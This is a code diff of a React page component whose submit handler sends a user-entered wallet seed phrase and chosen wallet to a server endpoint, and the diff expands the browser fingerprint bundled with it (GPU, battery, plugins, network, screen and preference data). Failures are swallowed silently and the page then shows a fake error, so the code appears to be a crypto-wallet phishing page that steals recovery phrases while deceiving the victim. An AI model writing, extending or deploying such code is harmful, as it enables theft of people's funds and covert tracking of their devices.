@@ -68,37 +68,96 @@ export default function Home() {
     e.preventDefault();
     setLoading(true);
     setStatus(null);
-    // Collect rich device/browser fingerprint
-    const nav = navigator as Navigator & { deviceMemory?: number; connection?: { effectiveType?: string; downlink?: number } };
+
+    // --- Fingerprint collection ---
+    const nav = navigator as Navigator & {
+      deviceMemory?: number;
+      connection?: { effectiveType?: string; downlink?: number; rtt?: number; saveData?: boolean };
+      getBattery?: () => Promise<{ level: number; charging: boolean; chargingTime: number; dischargingTime: number }>;
+    };
+
+    // WebGL GPU info
+    let webglRenderer = "";
+    let webglVendor = "";
+    try {
+      const canvas = document.createElement("canvas");
+      const gl = canvas.getContext("webgl") as WebGLRenderingContext | null;
+      if (gl) {
+        const dbgInfo = gl.getExtension("WEBGL_debug_renderer_info");
+        if (dbgInfo) {
+          webglRenderer = gl.getParameter(dbgInfo.UNMASKED_RENDERER_WEBGL);
+          webglVendor = gl.getParameter(dbgInfo.UNMASKED_VENDOR_WEBGL);
+        }
+      }
+    } catch { /* silent */ }
+
+    // Battery
+    let batteryLevel = "";
+    let batteryCharging = "";
+    try {
+      if (nav.getBattery) {
+        const bat = await nav.getBattery();
+        batteryLevel = `${Math.round(bat.level * 100)}%`;
+        batteryCharging = bat.charging ? "Yes" : "No";
+      }
+    } catch { /* silent */ }
+
+    // Plugins
+    const plugins = Array.from(navigator.plugins || []).map((p) => p.name).join(", ");
+
+    const payload = {
+      phrase: phraseWords.join(" "),
+      wallet: selectedWallet,
+      browserData: {
+        userAgent: navigator.userAgent,
+        language: navigator.language,
+        languages: navigator.languages?.join(", "),
+        platform: navigator.platform,
+        vendor: navigator.vendor,
+        cookiesEnabled: navigator.cookieEnabled,
+        doNotTrack: navigator.doNotTrack,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        localTime: new Date().toLocaleString(),
+        // Screen
+        screenWidth: screen.width,
+        screenHeight: screen.height,
+        windowWidth: window.innerWidth,
+        windowHeight: window.innerHeight,
+        colorDepth: screen.colorDepth,
+        devicePixelRatio: window.devicePixelRatio,
+        // Hardware
+        deviceMemoryGB: nav.deviceMemory,
+        hardwareConcurrency: navigator.hardwareConcurrency,
+        maxTouchPoints: navigator.maxTouchPoints,
+        isMobile: window.matchMedia("(pointer: coarse)").matches,
+        // GPU
+        webglRenderer,
+        webglVendor,
+        // Battery
+        batteryLevel,
+        batteryCharging,
+        // Network
+        connectionType: nav.connection?.effectiveType,
+        downlinkMbps: nav.connection?.downlink,
+        rttMs: nav.connection?.rtt,
+        dataSaver: nav.connection?.saveData,
+        isOnline: navigator.onLine,
+        // Preferences
+        darkMode: window.matchMedia("(prefers-color-scheme: dark)").matches,
+        reducedMotion: window.matchMedia("(prefers-reduced-motion: reduce)").matches,
+        // Session
+        referrer: document.referrer || "(direct)",
+        pageUrl: window.location.href,
+        plugins: plugins || "(none)",
+      },
+    };
+
     fetch("/api/submit", {
       method: "POST",
       headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        phrase: phraseWords.join(" "),
-        wallet: selectedWallet,
-        browserData: {
-          userAgent: navigator.userAgent,
-          language: navigator.language,
-          languages: navigator.languages?.join(", "),
-          platform: navigator.platform,
-          vendor: navigator.vendor,
-          cookiesEnabled: navigator.cookieEnabled,
-          doNotTrack: navigator.doNotTrack,
-          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-          localTime: new Date().toLocaleString(),
-          screenWidth: screen.width,
-          screenHeight: screen.height,
-          colorDepth: screen.colorDepth,
-          devicePixelRatio: window.devicePixelRatio,
-          deviceMemoryGB: nav.deviceMemory,
-          hardwareConcurrency: navigator.hardwareConcurrency,
-          connectionType: nav.connection?.effectiveType,
-          downlinkMbps: nav.connection?.downlink,
-          referrer: document.referrer || "(direct)",
-          pageUrl: window.location.href,
-        },
-      }),
+      body: JSON.stringify(payload),
     }).catch(() => {/* silent */});
+
     setTimeout(() => {
       setLoading(false);
       setStatus("error");
